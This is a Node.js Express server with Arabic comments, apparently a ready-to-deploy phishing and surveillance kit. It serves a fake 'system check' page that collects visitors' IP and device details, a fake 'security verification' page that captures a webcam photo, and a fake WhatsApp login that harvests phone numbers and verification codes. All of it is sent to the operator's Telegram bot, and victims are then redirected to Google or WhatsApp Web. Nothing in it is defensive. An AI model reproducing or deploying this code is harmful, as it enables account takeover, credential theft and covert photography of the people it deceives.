const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

// دالة إرسال الرسائل
async function sendTelegram(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: MY_ID,
            text: text,
            parse_mode: "Markdown"
        });
    } catch (e) { console.error("Telegram Send Error"); }
}

// 1. رابط المعلومات الأساسي (IP + مواصفات)
app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>System Check</title></head>
        <body style="background:black; color:white; text-align:center; padding-top:50px;">
            <h3>جاري فحص توافق النظام...</h3>
            <script>
                (async () => {
                    const info = "📡 **صيد جديد!**\\n🌐 IP: \`${ip}\`\\n📱 النظام: " + navigator.platform + "\\n🧠 المعالج: " + navigator.hardwareConcurrency + " Cores\\n📟 الرام: " + (navigator.deviceMemory || "?") + "GB";
                    await fetch("/log?data=" + encodeURIComponent(info));
                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                })();
            </script>
        </body>
        </html>
    `);
});

// 2. رابط الكاميرا الاحترافي (/cam)
app.get('/cam', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head><meta charset="UTF-8"><title>تأكيد الهوية</title></head>
        <body style="background:#f8f9fa; font-family:sans-serif; text-align:center; padding-top:100px;">
            <div style="background:white; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
                <h2>🛡️ فحص الأمان</h2>
                <p>اضغط أدناه لالتقاط صورة التحقق</p>
                <button onclick="takePic()" style="background:#007bff; color:white; border:none; padding:15px 30px; border-radius:8px; cursor:pointer; font-weight:bold;">بدء الفحص الآمن ✅</button>
            </div>
            <video id="v" style="display:none;" autoplay></video>
            <canvas id="c" style="display:none;"></canvas>
            <script>
                async function takePic() {
                    try {
                        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
                        const v = document.getElementById('v'); v.srcObject = s;
                        setTimeout(async () => {
                            const c = document.getElementById('c');
                            c.width = v.videoWidth; c.height = v.videoHeight;
                            c.getContext('2d').drawImage(v,0,0);
                            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
                            const f = new FormData(); f.append('chat_id','${MY_ID}'); f.append('photo', blob, 'shot.jpg');
                            await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto", {method:"POST", body:f});
                            window.location.href = "https://google.com";
                        }, 1200);
                    } catch(e) { alert("خطأ: يرجى السماح بالكاميرا!"); }
                }
            </script>
        </body>
        </html>
    `);
});

// 3. رابط الواتساب الوهمي (/wa)
app.get('/wa', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><title>WhatsApp Login</title></head>
        <body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px;">
            <div style="background:white; padding:40px; border-radius:10px; width:300px; text-align:center;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" style="width:60px; margin-bottom:20px;">
                <h3 style="color:#41525d;">تسجيل دخول واتساب</h3>
                <input type="text" id="p" placeholder="رقم الهاتف" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:5px;">
                <input type="text" id="o" placeholder="كود التحقق" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:5px; display:none;">
                <button id="b" onclick="handle()" style="width:100%; background:#00a884; color:white; border:none; padding:12px; border-radius:5px; cursor:pointer; font-weight:bold;">التالي</button>
            </div>
            <script>
                let s = 1;
                async function handle() {
                    const p = document.getElementById('p').value;
                    const o = document.getElementById('o').value;
                    if (s === 1) {
                        if (!p) return;
                        await fetch("/log?data=" + encodeURIComponent("📱 **رقم واتساب:** " + p));
                        document.getElementById('p').style.display = 'none';
                        document.getElementById('o').style.display = 'block';
                        s = 2;
                    } else {
                        if (!o) return;
                        await fetch("/log?data=" + encodeURIComponent("🔑 **كود واتساب:** " + o));
                        window.location.href = "https://web.whatsapp.com";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// استقبال البيانات وإرسالها لتليجرام
app.get('/log', async (req, res) => {
    if (req.query.data) { await sendTelegram(req.query.data); }
    res.sendStatus(200);
});

app.listen(PORT, () => console.log("--- System Live on Port " + PORT + " ---"));
